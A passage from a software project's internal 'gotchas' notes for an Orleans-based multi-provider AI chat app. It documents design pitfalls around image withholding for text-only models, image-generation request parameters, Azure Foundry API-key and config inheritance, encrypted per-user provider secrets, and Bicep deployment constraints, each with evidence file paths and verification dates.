  `NoToolModel_StillGetsDocumentRetrieval`, `SkillsDisabled_DropsLoadSkill_KeepsRetrieval`),
  `tests/Agent42.Tests/FakeChatClient.cs` (`ToolsEcho`)
- **Verified:** 2026-07-17

### Withholding images from a no-vision model must cover HISTORY, not just the new turn

- **Claim:** "don't attach the image when the model can't see it" is only half the gate, and the missing
  half is the one that leaks. Prior turns' image parts **live on in the serialized session** and are
  replayed to the model on every later turn (which is also why `RehydrateAttachmentUrlsAsync` exists at
  all) — so a conversation that switches to a text-only model would still ship **every earlier image URL**
  to it. That URL is a **SAS into our private `attachments` container** (ADR 0004), and a third-party
  model's host really does fetch what it is given (ADR 0013 spike confirmed it against GitHub Models) — so
  this hands a live credential-bearing URL to an endpoint outside the tenant, for an image it cannot even
  read. The withholding is done in the rehydrate pass and is **reversible**: it reads `TurnAttachments`
  (the durable per-turn record) rather than deleting parts, so switching back to a vision model
  *restores* them. A destructive strip would blind the conversation's history forever after one visit to
  a text-only model. Note the test marker: `[img:N]` counts only the **last** user message, so it cannot
  see this bug — `[allimg:N]`, which counts image parts across the whole request, is the one that can.
- **And stripping the parts is not enough: an IMAGE-ONLY turn is left EMPTY.** The composer deliberately
  allows a blank-text turn with a photo attached, so that message's *only* content part is the image.
  Remove it and the message has **zero** content parts — which OpenAI-compatible endpoints reject
  outright, bricking the conversation on precisely the third-party model this feature exists for. It gets
  a **placeholder `TextContent`** instead. (`StripToolHistory` can simply drop an emptied message; this
  cannot — the `TurnAttachments`↔user-turn join is **positional**, so dropping a turn misaligns every
  image after it.) A `FakeChatClient` cannot reject an empty message the way the real service does, so
  the test for this would pass vacuously — hence the `[emptymsg:N]` echo, which makes the property
  observable. Mutation-checked: remove the placeholder and `NoVisionModel_ImageOnlyTurn_StillReplies`
  fails.
- **Evidence:** `src/Agent42.Agents/AgentGrain.cs` (`RehydrateAttachmentUrlsAsync(bool includeImages)`,
  `StripImageParts`, `WithheldImagePlaceholder`), `tests/Agent42.Tests/AgentGrainTests.cs`
  (`NoVisionModel_SendsNoImageContent`, `NoVisionModel_ImageOnlyTurn_StillReplies_AndSendsNoImage`),
  `tests/Agent42.Tests/FakeChatClient.cs` (`AllImagesEcho`, `EmptyMessageEcho`)
- **Verified:** 2026-07-14

### An assistant generated image is id-keyed (message-level prop), never joined by assistant-message position

- **Claim:** a generated image (ADR 0020) is the *assistant* twin of a user attachment, but the two must NOT
  share the positional join. User images work because there is **exactly one `ChatRole.User` message per
  turn**, so `TurnAttachments[userTurnIndex]` aligns. The **assistant side is not 1:1 with turns**: a
  tool-calling turn emits a *standalone* `FunctionCallContent` assistant message **plus** a separate text
  assistant message (true even offline — `FakeChatClient` emits both), so any list keyed on assistant-**message
  index** drifts by one for every prior tool turn — misaligning the image against the wrong bubble AND the
  vision-gate strip/restore. So generated images are stored **id-keyed** in `AgentGrainState.GeneratedImages`
  (`Dictionary<string, AttachmentRef>`), and the link from the session's assistant message to its ref is an
  **`assistantImageId` in the message's MESSAGE-LEVEL `AdditionalProperties`** — not the content-level prop,
  because the Step-0 spike proved the message-level id survives BOTH session serialize/deserialize AND the
  image-strip (the content-level `UriContent` is removed when withholding from a no-vision model, so an id
  living only on the `UriContent` would be lost). History, the most-recent-image walk (edit input), and the
  strip/restore all look up by that id. Two more traps: (1) the image-gen branch runs in `ChatCoreAsync`
  **before** the chat vision-gate — an image model *consumes* images (it edits them), so it must not be routed
  through the withhold-from-a-no-vision-model gate; (2) `AgentGrain`'s own image abstraction is
  **`IImageGenerationService`, not `IImageGenerator`** — M.E.AI 1.13 ships `Microsoft.Extensions.AI.IImageGenerator`,
  and a same-named type is an ambiguous reference (CS0104) in any Backend file importing both namespaces (the
  spike hit this on `ImageGenerationOptions`). The offline harness cannot reach a real `/v1/images` endpoint
  (`InMemoryImageGenerator` returns a canned PNG), so the prod `OpenAIImageGenerator` is prod-smoke only; the
  id-keyed correctness IS testable — `NoVisionModel_WithholdsAssistantImage_AndRestores_AcrossToolTurn`
  interleaves a tool turn **before** the image turn so a positional bug would surface (a clean single-turn test
  would pass vacuously).
- **Evidence:** `src/Agent42.Agents/AgentGrain.cs` (`GenerateImageTurnAsync`, `RecordImageTurnAsync`,
  `AssistantImageRef`, `FindMostRecentImageRef`, `RehydrateAssistantImageAsync`, `AssistantImageIdKey`),
  `src/Agent42.Agents/AgentGrainState.cs` (`GeneratedImages`),
  `src/Agent42.Agents/IImageGenerationService.cs`, `tests/Agent42.Tests/AgentGrainTests.cs`
  (`NoVisionModel_WithholdsAssistantImage_AndRestores_AcrossToolTurn`, `History_IncludesAssistantGeneratedImage`),
  `.agentic/decisions/0020-image-generation-model-capability.md`
- **Verified:** 2026-07-17

### Image request shape: send NO `response_format` (gpt-image-1 400s), and NO `api-version` (Azure won't work)

- **`response_format` must NOT be sent.** The current OpenAI image model **`gpt-image-1` rejects
  `response_format` with `HTTP 400 unknown_parameter`** ("Unknown parameter: 'response_format'") — it always
  returns base64 — while the older `dall-e-*` models accept it and otherwise default to a hosted **URL**. The
  first cut of `OpenAIImageGenerator` set `ResponseFormat = GeneratedImageFormat.Bytes` unconditionally, which
  **broke every `gpt-image-1` endpoint** (observed on the wire, HTTP 400). The fix: send an empty
  `ImageGenerationOptions()`/`ImageEditOptions()` (no `response_format`) and resolve the result **either way** —
  prefer inline `ImageBytes` (`gpt-image-1`), else download `ImageUri` (`dall-e`, via a plain static
  `HttpClient` — not a named/DI one, so it dodges the retry-pipeline gotcha; the URL is the user's own
  configured provider's, so it stays off the SSRF path per ADR 0018). Don't "restore" `ResponseFormat` to
  force bytes — it regresses `gpt-image-1`.
- **The image path also sends NO `api-version` — so an Azure/Foundry image endpoint won't work as OpenAICompatible.**
- **Claim:** image generation (ADR 0020) rides `Provider.OpenAICompatible`'s plain `OpenAIClient`
  (`OpenAIClient(...).GetImageClient(model)`), the SAME client shape as the OpenAI-compatible *chat* path —
  **not** the Azure SDK. A spike against the pinned `OpenAI 2.12.0` (capturing the outbound request URI with
  a short-circuiting pipeline policy) confirmed the requests are exactly `POST {endpoint}/images/generations`
  and `POST {endpoint}/images/edits` with **no `api-version` query parameter** (with `endpoint` ending
  `/v1`, that is `/v1/images/generations`). `api-version` is an **Azure-ism** added only by
  `AzureOpenAIClient`, which is used solely on the Foundry *chat* path — never here. Consequence: a real
  OpenAI-compatible image endpoint (OpenAI itself, or a self-hosted vLLM/Ollama-style server implementing the
  `/images/generations` + `/images/edits` shape) works with no `api-version`, which is correct for it — but an
  **Azure OpenAI / Foundry image deployment configured as an `OpenAICompatible` provider will fail**, because
  Azure requires BOTH `?api-version=…` AND a different URL shape
  (`/openai/deployments/{deployment}/images/generations`). This is why ADR 0020 scopes image gen to
  OpenAI-compatible endpoints and puts Foundry image gen out of scope. Adding Azure image support later means
  a Foundry-flavored image path (an `api-version` policy + the deployment URL), analogous to how the Responses
  chat path already does its `api-key`-header + `/openai/v1` handling (ADR 0014/0017) — not a config tweak.
- **Evidence:** `src/Agent42.Backend/OpenAIImageGenerator.cs` (no `ResponseFormat`; `ResolveBytesAsync`
  bytes-or-URL fallback; the SDK `ImageClient` calls),
  `src/Agent42.Backend/ChatClientFactory.cs` (`Provider.OpenAICompatible` builds the client image gen reuses),
  `.agentic/decisions/0020-image-generation-model-capability.md` (Foundry image gen out of scope)
- **Verified:** 2026-07-17

### The Foundry provider's endpoint + ARM coordinates are INHERITED — never copy them into `Models:`

> **Amended by ADR 0019 (2026-07-17):** the app **no longer ships a baseline `foundry` chat provider** —
> `Models:Providers` is now `{}` and chat is fully per-user (ADR 0018). The inheritance MECHANISM below
> (`ResolveFoundry` falling back to `AzureOpenAI:*`) still exists in code and would apply to a baseline
> Foundry provider re-added to `appsettings`, but no shipped provider exercises it. Two concrete claims
> below are now dead: the `Models:Default` derivation is **gone** (Default stays `""`; there is no operator
> default), and `AzureOpenAI:DeploymentName`/`SubscriptionId`/`ResourceGroup`/`AccountName` (+ their Bicep
> params/env vars) were **removed**. Only `AzureOpenAI:Endpoint`/`ApiKey`/`EmbeddingDeploymentName`/`TenantId`
> remain, and the key now authenticates **embeddings** only. See the "Chat is fully per-user" gotcha.

- **Claim:** the `foundry` provider in `appsettings.json` deliberately declares **none** of `Endpoint`,
  `ApiKey` (ADR 0017), `SubscriptionId`, `ResourceGroup`, `AccountName`, and that emptiness is load-bearing
  rather than an omission: all fall back to the top-level **`AzureOpenAI:*`** keys, which Bicep threads in
  as env vars (`AzureOpenAI__Endpoint`, `AzureOpenAI__ApiKey`) and which the **embedding client** — out of
  scope for multi-provider — also reads (the key especially: one `AzureOpenAI__ApiKey`, never a second
  `Models__Providers__foundry__ApiKey`). Copying the endpoint into `Models:Providers:foundry:Endpoint` creates a
  second source of truth, and prod then silently talks to whatever appsettings says while the Bicep param
  points somewhere else. Declaring all four is exactly how a **second** Foundry account is added (and it
  must be all four: `AzureModelCatalog` is constructed **per discovering provider** with *its own*
  coordinates — a single shared catalog reading the three global keys would make account #2 enumerate
  account #1's deployments and label them as its own, which is silently wrong rather than a failure).
  Two things a second account does **not** get for free: embeddings stay on the primary account, and it
  must declare its **own `ApiKey`** (ADR 0017 — a key-based Foundry provider authenticates by key, not an
  MI grant; the *Cognitive Services OpenAI User* grant is no longer the mechanism).
- **The same rule governs `Models:Default`, and it is easy to miss.** `AzureOpenAI:DeploymentName` is
  threaded in by Bicep (`AzureOpenAI__DeploymentName`), so `Models:Default` is left **empty** in
  appsettings and derived as `foundry:<AzureOpenAI:DeploymentName>`. Hardcoding `"foundry:gpt-4o"` there
  — which the first draft did — silently overrides the env var and turns the Bicep param into **dead
  config**: it looks authoritative and changes nothing. Exactly the trap shape as SearXNG's inert
  `server.port` below.
- **Evidence:** `src/Agent42.Backend/ModelProviderOptions.cs` (`ProviderSettings.ResolveFoundry` — the
  inheritance mechanism, still live for a re-added baseline Foundry provider),
  `src/Agent42.Backend/ModelProviderBuilder.cs`, `src/Agent42.Backend/appsettings.json` (the `"//Default"`
  comment; the `foundry` block was removed by ADR 0019),
  `tests/Agent42.Tests/ModelProviderTests.cs`
  (`TwoFoundryProviders_ResolveOwnCoordinates_AndInheritWhenAbsent`),
  `.agentic/decisions/0017-foundry-provider-api-key-auth.md` (the `ApiKey` inheritance),
  `.agentic/decisions/0019-remove-baseline-chat-providers.md` (baseline removed)
- **Verified:** 2026-07-16

### A user provider overlay is best-effort (baseline wins) and its endpoint is deliberately NOT SSRF-guarded

> **Amended by ADR 0019 (2026-07-17):** the baseline chat set now ships **EMPTY** (`Models:Providers: {}`),
> so "baseline wins" is **vacuous for chat** — there is no baseline chat entry to fall back to. The
> best-effort merge rule (an `Invalid`/`Skipped` overlay build keeps the baseline entry **if one exists,
> else skips**) is unchanged in code, but with an empty baseline "else skips" is the only branch that ever
> fires for chat. A user with no valid provider ends up with **zero** providers and an empty picker (the
> grain then stays valid via a no-op client — see the "Chat is fully per-user" gotcha). Only the **embedding**
> `AzureOpenAI:*` key is still an availability floor. The SSRF-guard-free endpoint claim below is unchanged.

- **Claim:** a signed-in user can add/override providers (ADR 0018), but that overlay is layered **after**
  boot and must **never** brick the app. ~~The operator env/`appsettings` set stays the boot-time
  availability floor~~ (ADR 0019: the **chat** baseline is now empty; only embeddings remain a floor):
  `ModelProviderBuilder.Build` still **throws** on a blank *baseline* Foundry key when one is configured
  (ADR 0017), but no baseline chat provider ships. The per-user path — `UserProviderResolver.Merge` calls the
  **same** `ModelProviderBuilder.TryBuildProvider` per provider (one home for the Foundry inheritance / skip /
  fatal rules — do not duplicate them), but on an `Invalid`/`Skipped` result it **keeps the baseline-built
  entry if one exists, else skips** — never throws. With the baseline now empty, a bad override simply leaves
  the user with fewer (often zero) providers. Two more consequences that are easy to get wrong: (1) user
  overlay providers do **NOT** inherit the operator `AzureOpenAI:*` secrets — the resolver builds them with
  an **empty** `IConfiguration` (`NoInheritance`), both so the operator key never reaches a user-chosen
  endpoint and so a blanked user Foundry key genuinely resolves `Invalid` (otherwise it would silently
  re-inherit and the fall-back could never be tested); (2) the overlay default is honoured **only** when it
  names a provider that actually built, else the baseline default stands — passing an unbuilt default to
  `MultiProviderChatClientFactory` would throw in `Resolve`.
- **The user endpoint is deliberately NOT SSRF-guarded — keep it that way.** It must accept
  `http://localhost:11434` (Ollama) and other private hosts (a supported target), so it carries **no SSRF
  address-guard**; validation is only absolute `http`/`https` + a parseable `Kind`. This is safe **only**
  because the endpoint comes from the authenticated user's **own persisted config**, never from a model or
  a live request — the property that distinguishes config from a model/request-supplied address (the
  distinction ADR 0011's fetch guard once enforced, before ADR 0027 removed that path). Do not add an
  address guard here, and do not let any future change accept a provider endpoint from a tool argument or
  request body — that would make it a genuine SSRF sink.
- **Evidence:** `src/Agent42.Backend/UserProviderResolver.cs` (`Merge`, `NoInheritance`, `EffectiveDefault`),
  `src/Agent42.Backend/ModelProviderBuilder.cs` (`TryBuildProvider` / `Build`),
  `src/Agent42.Backend/AgentApi.cs` (`ValidateProvider` — no guard),
  `tests/Agent42.Tests/UserProviderResolverTests.cs`
  (`FoundryOverrideWithBlankKey_FallsBackToBaseline`, `OverlayDefault_NamingAMissingProvider_FallsBackToBaselineDefault`),
  `tests/Agent42.Tests/ProvidersApiTests.cs` (`AcceptsLocalhost_RejectsMalformed`)
- **Verified:** 2026-07-16

### A user provider's API key is encrypted, never echoed — and its Data Protection key ring MUST persist

- **Claim:** user provider secrets (ADR 0018) are encrypted with `IDataProtector` **before** they reach the
  overlay grain (`ProviderSecretProtector`): the grain stores **ciphertext only**, `GET /api/providers`
  masks to `hasKey: bool` (never the ciphertext, never plaintext), and the key rides a distinct
  `"providers"` grain state — never the 2 MB session (ADR 0004). On update a **blank** `ApiKey` means
  "keep the stored key" (the field is write-only in the UI), mapped as a null ciphertext the grain reads as
  "keep". The load-bearing trap is **key-ring persistence**: in prod the ring MUST persist out-of-process,
  or a restart rotates it and every stored secret becomes undecryptable. `Program.cs` gates that on the
  **prod `Storage:BlobEndpoint` branch** (NOT `GetConnectionString("blobs")`, the Azurite/AppHost path) and
  uses the **MI `PersistKeysToAzureBlobStorage(BlobClient)` overload** — the connection-string overload
  cannot work because shared-key auth is disabled on the account. DevHost/tests use the default **ephemeral**
  ring (nothing persisted there). **Precise posture:** the user secrets are DP-encrypted; the DP **master
  key** itself sits in the `dataprotection` blob container protected only by **Storage SSE + RBAC** (no
  `ProtectKeysWith…`) — not "encrypted at rest" in the envelope-key sense. `Unprotect` **swallows**
  `CryptographicException` → null (a rotated ring degrades the provider to "no key", never throws).
- **Evidence:** `src/Agent42.Backend/ProviderSecretProtector.cs`, `src/Agent42.Backend/Program.cs`
  (the `AddDataProtection` block), `src/Agent42.Backend/AgentApi.cs` (`Mask`, `ToStored`),
  `infra/modules/storage.bicep` (the `dataprotection` container),
  `tests/Agent42.Tests/ProviderSecretProtectorTests.cs`, `tests/Agent42.Tests/ProvidersApiTests.cs`
  (`Get_NeverReturnsKey`, `Put_BlankKey_KeepsStoredKey`)
- **Verified:** 2026-07-16

### The per-user chat-client factory is resolved on grain activation, not injected — order matters

- **Claim:** because providers are now per-user (ADR 0018), `AgentGrain` can no longer take a singleton
  `IChatClientFactory` in its constructor. It takes `IUserChatClientFactoryProvider` and resolves a
  **user-scoped** `_chatClientFactory` **once** in `OnActivateAsync` — from the userId parsed off its grain
  key (everything before the **first** `/` of `{userId}/{conversationId}`; a userId is an opaque Easy-Auth
  principal id with no `/`). **Hard ordering constraint:** the `await …GetForUserAsync(userId)` assignment
  MUST run **before** the first dereference of `_chatClientFactory` (the `_modelId` assignment and the
  `BuildAgent` call right after) — resolving it later NREs. The sync `IChatClientFactory` interface and its
  ~8 in-grain call sites are unchanged; only the resolution moved. Ripple to remember: every host that
  registers `IChatClientFactory` for a grain (the four silo configurators + DevHost) must also register
  `IUserChatClientFactoryProvider` — the `SingleUserChatClientFactoryProvider` adapter is the one-line
  stand-in offline/in tests. The backend impl caches the built factory by **(userId, overlay version)**, so
  a save (which bumps the grain's version) is picked up on the next activation with no restart — full
  live-reload of active grains is out of scope.
- **Amended by ADR 0019 (2026-07-17): the `_modelId` assignment is now conditional, and the factory is
  re-resolved on the no-model path.** With the baseline chat set empty, activation can resolve a factory
  with **zero** providers (`DefaultModelId == ""`). `_modelId` is then set to `""` **regardless of a
  persisted `DeploymentName`** (`_modelId = string.IsNullOrEmpty(factory.DefaultModelId) ? "" :
  (_state.State.DeploymentName ?? factory.DefaultModelId)`), and `BuildAgent` runs against the no-op
  `NoModelChatClient` so `_agent`/`_session` stay valid. Because the factory is captured **once per
  activation**, a user who adds their first provider on an already-activated grain would keep the empty
  factory — so `_userId` is now a **retained field** and `ChatCoreAsync`/`ReceiveReminder` **re-resolve**
  `GetForUserAsync(_userId)` on the no-model path and rebind (`RebindModelAsync`) if a model became
  available. See the "Chat is fully per-user" gotcha.
- **Evidence:** `src/Agent42.Agents/AgentGrain.cs` (`OnActivateAsync`, `UserIdFromGrainKey`),
  `src/Agent42.Agents/IUserChatClientFactoryProvider.cs`,
  `src/Agent42.Backend/UserChatClientFactoryProvider.cs`,
  `tests/Agent42.Tests/UserChatClientFactoryProviderTests.cs` (`VersionBump_ReturnsFreshFactory`)
- **Verified:** 2026-07-16

### Chat is fully per-user — the app ships NO baseline chat provider, and the grain stays valid via a no-op client

- **Claim:** ADR 0019 removed the baseline chat availability floor. `Models:Providers` in `appsettings.json`
  is `{}`, so the app boots with **zero** chat providers; chat is **only** the per-user overlay (ADR 0018).
  A user with none configured sees an **empty picker** and a **gated composer** (the frontend disables send
  + the input and shows a hint when `/api/models` is empty). The **only** fixed model left is the
  **embedding** endpoint/key (`AzureOpenAI:Endpoint`/`ApiKey`/`EmbeddingDeploymentName`) for document RAG —
  it is the sole remaining availability path, still **fatal-if-blank** at startup and Bicep-`@minLength(32)`
  guarded. The chat-only `AzureOpenAI:*` keys (`DeploymentName`/`SubscriptionId`/`ResourceGroup`/`AccountName`)
  and their Bicep params/env vars, plus the whole operator-level GitHub Models token wiring (a Bicep param,
  a Container App secret, and its `Models__Providers__github__ApiKey` env var), were **removed** — leaving
  that wiring in place would resurrect a broken baseline `github` provider (`ProviderKind` defaults to
  `AzureOpenAI`, so a keyed-but-
  blockless config node becomes a Foundry provider on the Azure endpoint with a GitHub PAT), re-breaking
  the empty-baseline invariant.
- **The load-bearing design: a no-op `NoModelChatClient` keeps `_agent`/`_session` valid with no model.**
  `AgentGrain.BuildAgent` only **wraps** the client — `ChatClientAgent` construction and every session
  serialize/deserialize/create op never invoke inference — so an empty
  `MultiProviderChatClientFactory` (ctor no longer throws on `providers.Count == 0`; `GetClient` returns the
  shared `NoModelChatClient`, `GetCapabilities` returns `(false,false)`, `DefaultModelId == ""`) lets the
  grain build a valid agent even with no model. **Do NOT scatter null-guards across the ~6 `_agent`/`_session`
  deref sites** (history/bind/register/reminder/rehydrate/build) — that was the rejected alternative; the
  no-op client is why they all stay non-null. Only the two sites that actually **run** the model act on the
  no-model signal (`string.IsNullOrEmpty(_chatClientFactory.DefaultModelId)`): `ChatCoreAsync` re-resolves +
  rebinds (or yields a `TextDelta` notice + `Done`, never persisted), `ReceiveReminder` re-resolves + rebinds
  (or logs + returns). A provider must declare **≥1 model** (`ValidateProvider`, 400) so "factory has
  providers ⟺ a usable default exists" — no keyed-but-modelless gap.
- **Evidence:** `src/Agent42.Backend/NoModelChatClient.cs`, `src/Agent42.Backend/ChatClientFactory.cs`
  (empty-tolerant ctor + `GetClient`/`GetCapabilities` guards), `src/Agent42.Agents/AgentGrain.cs`
  (`_modelId` conditional, `ChatCoreAsync` no-model block, `RebindModelAsync`, `ReceiveReminder` guard),
  `src/Agent42.Backend/UserProviderResolver.cs` (`EffectiveDefault` → first declared model → `""`),
  `src/Agent42.Backend/ModelCatalog.cs` (empty-default ⇒ empty catalog), `src/Agent42.Backend/AgentApi.cs`
  (`ValidateProvider` ≥1-model rule), `src/Agent42.Backend/appsettings.json` (`Models:Providers: {}`),
  `src/Agent42.Backend/Program.cs` (no default derivation, no eager `GetClient(null)`), `infra/main.bicep`
  + `infra/modules/container-app.bicep` (removed chat-only params/env vars + the operator GitHub Models token wiring),
  `src/Agent42.Backend/wwwroot/app.js` (`applyModelAvailability`),
  `tests/Agent42.Tests/AgentGrainTests.cs` (`NoModel_YieldsNotice_AndHistoryDoesNotThrow`,
  `NoModelThenProviderAdded_ReResolvesAndReplies`, `RebindAfterRegainingModel_PreservesHistory`),
  `tests/Agent42.Tests/ProvidersApiTests.cs` (`RejectsProviderWithNoModels`),
  `.agentic/decisions/0019-remove-baseline-chat-providers.md`
- **Verified:** 2026-07-17

### GitHub Models: the context-limit error is a 413, and the caps are small enough to matter here

- **Claim:** two traps, both measured against the real service. (1) A request over the model's input cap
  fails with **HTTP 413** and `{"error":{"code":"tokens_limit_reached", … "Max size: N tokens."}}` — **not**
  the 400 a context-length overflow returns on Azure OpenAI, so any handling or messaging keyed on 400/429
  sails straight past it. (2) The caps are **per request** and small: **16,000** input tokens for
  `openai/gpt-4o` / `openai/gpt-4.1`, **8,000** for the `-mini` models, **4,000** for `openai/o4-mini` —
  and enabling **pay-as-you-go billing and a budget did not lift them** (measured before and after).
  That is tight for *this* app specifically, because the session replays an 8 KB fetched page, search
  snippets and RAG excerpts on **every** turn (see "an agent tool's RETURN value is persisted"), so a
  web- or document-heavy conversation hits 413 on a GitHub model long before it would on Foundry. Also
  worth knowing when re-verifying: tool support is **per model, not per provider** (`microsoft/phi-4`
  400s on a tools request; `deepseek/DeepSeek-V3-0324` never calls one), which is why the flags are
  config, and they were measured rather than assumed. **As of ADR 0019 GitHub Models is no longer a
  baseline `appsettings` provider — it is a user-added `OpenAICompatible` provider (ADR 0018)** with the
  same per-model caps; the measured numbers below are unchanged.
- **Evidence:** `.agentic/decisions/0013-multi-provider-model-catalog.md` (spike results — the caps + the
  413 behaviour), `.agentic/decisions/0019-remove-baseline-chat-providers.md` (github is now per-user)
- **Verified:** 2026-07-14

### The Responses API is stateful by default — three non-obvious traps on the Foundry Responses path

- **Claim:** the `UseResponsesApi` Foundry path (ADR 0014) hides three traps the compiler and the method
  names do **not** make obvious. (1) **Stateless is mandatory, not a preference.** The Responses API
  stores each response server-side by default and later turns reference it by id — which would break the
  client-side-history invariant the whole grain is built on (it holds all history and replays it via
  `TryGetInMemoryChatHistory`, ADR 0004). So the build MUST use
  `AsIChatClientWithStoredOutputDisabled`, **never** the plain `AsIChatClient()` on the response client —
  the plain one silently stores and looks identical at the call site. (2) **`includeReasoningEncryptedContent`
  must be passed `false`.** The helper **defaults it `true`**, which sends
  `include:["reasoning.encrypted_content"]`; **non-reasoning models (gpt-5.4, the shipped default) reject
  that with HTTP 400** (`Encrypted content is not supported with this model`) — measured on the wire by the
  Step-1 spikes, invisible in the signature. `true` is only wanted for a *reasoning* Foundry model (to
  carry reasoning items across turns without server storage), and those are deferred. (3) **Two distinct
  experimental suppressions are needed, not one.** `GetResponsesClient()` / the
  `OpenAIClient(AuthenticationPolicy, options)` ctor are `[Experimental("OPENAI001")]`, but
  `AsIChatClientWithStoredOutputDisabled` is `[Experimental("MAAI001")]` (Microsoft.Agents.AI, a
  **different** id) — `OPENAI001` alone does not build. Scope both `#pragma`s to the branch; do not
  blanket-suppress. **Auth note (ADR 0017):** that `AuthenticationPolicy` ctor argument is now the
  `api-key`-header policy carrying the Azure OpenAI key, not the deleted managed-identity bearer bridge —
  see the "Azure's `/openai/v1` authenticates the resource key via the `api-key` header" gotcha below.
- **Evidence:** `src/Agent42.Backend/ChatClientFactory.cs` (`Provider.Foundry`, the `UseResponses`
  branch), `.agentic/decisions/0014-responses-api-stateless-mode.md`, `.agentic/decisions/0017-foundry-provider-api-key-auth.md`
- **Verified:** 2026-07-16

### Azure's `/openai/v1` authenticates the resource key via the `api-key` header — three Foundry-key traps

> **Amended by ADR 0019 (2026-07-17):** the app no longer ships a baseline Foundry **chat** provider, so
> trap (2)'s "the **Foundry** key is on the availability path" narrows to "the **embedding** key is on the
> availability path" — the same `AzureOpenAI:ApiKey` now authenticates the embedding client only, still
> fatal-if-blank (Program.cs + Bicep `@minLength(32)`). Trap (3)'s shipped-`foundry`-provider details
> (`Discover:false`, declared `gpt-5.4`, `AzureOpenAI:DeploymentName`/`azureOpenAIDeploymentName`) are
> **gone with the baseline provider** — a Foundry chat model is now a per-user provider (ADR 0018), which
> declares its own deployments and its own key (no inheritance). Trap (1) (the `api-key`-header policy) is
> unchanged and still applies to any Foundry provider a user configures with Responses on.
> See the "Chat is fully per-user" gotcha.

- **Claim:** the Foundry provider authenticates with an Azure OpenAI **API key** (ADR 0017), and three
  things trip an agent that assumes otherwise. (1) **On the Responses `/openai/v1` path, use a custom
  `api-key`-header `AuthenticationPolicy`, NOT the OpenAI SDK's `ApiKeyCredential`.** `ApiKeyCredential`
  sends `Authorization: Bearer <key>` — Azure's `/openai/v1` reads the resource key from the **`api-key`
  request header**. The 2026-07-16 Step-1 spike found the correct key gets *past auth* on **both** header
  positions (a wrong key 401s on both), but `api-key` is Azure's documented mechanism, so that is what
  ships; do not "simplify" it to `ApiKeyCredential` (undocumented Bearer that could regress). The Chat
  path is fine — `AzureOpenAIClient(endpoint, AzureKeyCredential)` sends `api-key` itself. (2) **The
  Foundry key is on the AVAILABILITY PATH — a blank one is FATAL, unlike a third-party provider key.**
  `ModelProviderBuilder.Build` throws when the resolved Foundry key is blank (mirrored in Bicep by a
  `@secure() @minLength(32)` param following the **`searxngSecret` shape** — unconditional secret + env +
  a `@minLength`, though `searxngSecret` itself uses 16); a *third-party* provider with no key is merely
  skipped. Resolution is `Models:Providers:<key>:ApiKey` ?? `AzureOpenAI:ApiKey`, and the embedding client
  reads the same `AzureOpenAI:ApiKey` — **one** env var (`AzureOpenAI__ApiKey`), never a second
  `Models__Providers__foundry__ApiKey`. (3) **ARM discovery is OFF for a key-based Foundry provider, and
  `gpt-4o` is not deployed.** A data-plane key can't authenticate ARM, so the shipped `foundry` provider
  sets `Discover: false` and **declares** its deployments in `appsettings`; the picker offers **exactly**
  those, and the **default deployment must be one of them** — `CompositeModelCatalog` only synthesizes the
  default when *nothing* is declared (`ModelCatalog.cs`, `if (models.Count == 0)`), so a default missing
  from a non-empty declared list silently **vanishes from the picker**. Keep `AzureOpenAI:DeploymentName`
  (Bicep `azureOpenAIDeploymentName`) in sync with the `Models` list — the same single-source trap the
  "endpoint is INHERITED" gotcha guards for `Models:Default`, now reappearing for the model *list* under
  dropped discovery. The spike found the account has **no `gpt-4o` deployment** (it has `gpt-5.4`,
  `gpt-4.1`, `gpt-5.1`, `o3`, `model-router`, `claude-*`), so the default deployment is **`gpt-5.4`**, not
  `gpt-4o` — with discovery off, a wrong default 404s every turn.
- **Evidence:** `src/Agent42.Backend/ChatClientFactory.cs` (`ApiKeyHeaderPolicy`, `Provider.Foundry`),
  `src/Agent42.Backend/ModelProviderBuilder.cs` (fatal-key throw), `src/Agent42.Backend/Program.cs`
  (eager `AzureOpenAI:ApiKey` check + embedding client), `src/Agent42.Backend/appsettings.json`
  (`foundry` `Discover:false` + `Models`, `DeploymentName: gpt-5.4`), `infra/main.bicep`
  (`azureOpenAIApiKey` `@minLength`), `.agentic/decisions/0017-foundry-provider-api-key-auth.md`
- **Verified:** 2026-07-16

### `HostedWebSearchTool.Name` is `web_search` — it collides with the SearXNG shim, so hosted models SWAP

- **Claim:** on the Responses path (ADR 0015) the grain does not just *add* `HostedWebSearchTool` /
  `HostedCodeInterpreterTool` alongside the existing SearXNG `web_search` / `fetch_web_page` shims — it
  **replaces** them, and that is forced, not a preference. In the agent pipeline `HostedWebSearchTool`
  surfaces under the protocol name **`web_search`** — the *same* name the shim (`AIFunctionFactory.Create(…,
  name: "web_search")`) uses — and `HostedCodeInterpreterTool` under `code_interpreter`. Registering both
  hands the model **two tools named `web_search`**. So `BuildAgent` swaps on `SupportsHostedTools`: shims
  out, hosted pair in. Two testing corollaries that bite: (a) the tool `.Name` is **not** the type name
  (`new HostedWebSearchTool().Name` reads `"web_search"`, not `"HostedWebSearchTool"`), so assert on the
  protocol names; and (b) `web_search` is ambiguous across both paths — the reliable discriminators are
  `code_interpreter` (hosted-only) and `fetch_web_page` (shim-only). (c) Absence assertions on the fake's
  echo must scope to the `[tools:…]` marker, because the `websearch` skill's description (injected into the
  system prompt) literally names `web_search`/`fetch_web_page`, so those substrings appear in the answer
  even when the tools do not.
- **Evidence:** `src/Agent42.Agents/AgentGrain.cs` (`BuildAgent`, the `SupportsHostedTools` swap),
  `tests/Agent42.Tests/AgentGrainTests.cs` (`HostedToolsModel_SwapsWebShimsForHostedTools`, `ToolNames`),
  `.agentic/decisions/0015-hosted-tools-on-responses-path.md`
- **Verified:** 2026-07-15

### Cosmos containers must be pre-declared in Bicep

- **Claim:** the Cosmos account has `disableLocalAuth: true` and AAD data-plane RBAC cannot create databases/containers — only ARM can. Any new container must be added to `infra/modules/cosmos.bicep`; Orleans providers run with `IsResourceCreationEnabled = false`, so runtime auto-create silently isn't there to save you.
- **Evidence:** `infra/modules/cosmos.bicep`, `src/Agent42.Backend/Program.cs`
- **Verified:** 2026-07-06

### Cosmos account region is pinned to northeurope and immutable

- **Claim:** West Europe rejected new Cosmos accounts at creation time; the account was created in North Europe and a Cosmos account's region can't change after creation. The `cosmosLocation="northeurope"` parameter in the deploy workflow must keep matching where the account actually lives.
- **Evidence:** `.github/workflows/deploy.yml`
- **Verified:** 2026-07-06

### Custom domain must stay declared in Bicep

- **Claim:** an undeclared custom domain gets silently unbound on the next deploy. `customDomainName`/`customDomainCertificateName` must stay set, and the certificate name must match the auto-generated managed certificate — if the cert is ever recreated, update the name or the deployment unbinds the domain again.
- **Evidence:** `infra/modules/container-app.bicep`
